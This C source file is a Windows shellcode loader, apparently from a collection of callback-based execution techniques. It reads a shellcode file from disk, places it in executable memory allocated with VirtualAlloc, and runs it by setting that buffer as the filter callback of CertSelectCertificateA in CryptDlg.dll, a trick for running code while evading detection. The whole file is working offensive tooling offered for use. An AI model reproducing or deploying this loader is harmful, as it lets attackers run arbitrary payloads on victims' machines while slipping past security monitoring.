// Wra7h/FlavorTown
// Minimum Supported Client: Windows XP
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Crypt32.lib")

#include <stdio.h>
#include <windows.h>
#include <cryptdlg.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;
	
	HCERTSTORE hCertStore = NULL;
	FARPROC CertSelectCertificate = NULL;
	CERT_SELECT_STRUCT SCSS = { 0 };

	if (argc != 2)
	{
		printf("Usage: CertSelectCertificate.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	hCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, NULL, CERT_SYSTEM_STORE_CURRENT_USER, L"My");

	SCSS.dwSize = sizeof(CERT_SELECT_STRUCT);
	SCSS.pfnFilter = hAlloc;
	SCSS.arrayCertStore = &hCertStore;
	SCSS.cCertStore = 1;

	CertSelectCertificate = GetProcAddress(LoadLibraryW(L"CryptDlg.dll"), "CertSelectCertificateA");

	if (CertSelectCertificate == NULL)
		goto CLEANUP;

	CertSelectCertificate(&SCSS);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hCertStore)
		CertCloseStore(hCertStore, 0);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}